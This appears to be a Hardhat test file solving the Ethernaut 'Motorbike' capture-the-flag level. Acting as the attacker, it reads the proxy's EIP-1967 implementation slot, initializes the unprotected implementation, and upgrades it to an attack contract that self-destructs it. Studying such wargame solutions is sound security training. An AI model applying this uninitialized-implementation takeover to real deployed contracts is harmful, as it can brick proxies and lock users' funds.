const { assert } = require("chai")
const { deployments, ethers } = require("hardhat")

describe("25-Motorbike", async function () {
    let deployer, attacker, instance, motorbike, engine, motorbikeAttack, implementation
    beforeEach(async function () {
        accounts = await ethers.getSigners()
        deployer = accounts[0]
        attacker = accounts[1]
        await deployments.fixture(["25"])
        const contract = await ethers.getContract("Motorbike")
        instance = contract.address
        motorbike = await ethers.getContractAt("Motorbike", instance, attacker)
        engine = await ethers.getContractAt("Engine", instance, attacker)
        motorbikeAttack = await ethers.getContract("MotorbikeAttack")
        // get implementation contract
        const implementationSlot =
            "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
        const implementationSlotData = await ethers.provider.getStorageAt(
            instance,
            implementationSlot
        )
        const implementationAddress = "0x" + implementationSlotData.slice(26, 66)
        implementation = await ethers.getContractAt("Engine", implementationAddress, attacker)
    })
    it("should set admin to attacker", async function () {
        // become upgrader of implementation contract
        await implementation.initialize()

        // change implementation to attack contract and call self destruct
        const data = motorbikeAttack.interface.encodeFunctionData("attack")
        await implementation.upgradeToAndCall(motorbikeAttack.address, data)

        // check engine contract was destroyed
        assert.equal(await ethers.provider.getCode(implementation.address), "0x")
    })
})
